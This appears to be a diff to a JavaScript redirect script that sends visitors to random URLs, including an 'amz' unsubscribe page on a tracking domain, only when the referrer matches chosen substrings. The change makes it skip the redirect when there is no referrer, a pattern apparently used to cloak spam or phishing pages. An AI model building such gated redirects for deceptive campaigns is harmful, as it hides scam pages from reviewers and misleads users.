@@ -25,16 +25,15 @@ const urls = [
     "https://server-tracking.eu/amz/unsubscribe-112024-01.html"
 ];
 
-
 // Function to handle redirection
 function redirectToRandomUrl(substrings) {
-    let referrer = document.referrer;
+    const referrer = document.referrer;
     console.log('Referrer:', referrer);  // Print the referrer for debugging
 
-    // If referrer is empty, use the current URL instead
+    // If referrer is empty, do nothing and return
     if (!referrer) {
-        referrer = window.location.href;
-        console.log('Referrer is empty, using current URL:', referrer);
+        console.log('No referrer found, not redirecting.');
+        return; // Exit the function if no referrer is found
     }
 
     // Check if the referrer contains any of the substrings
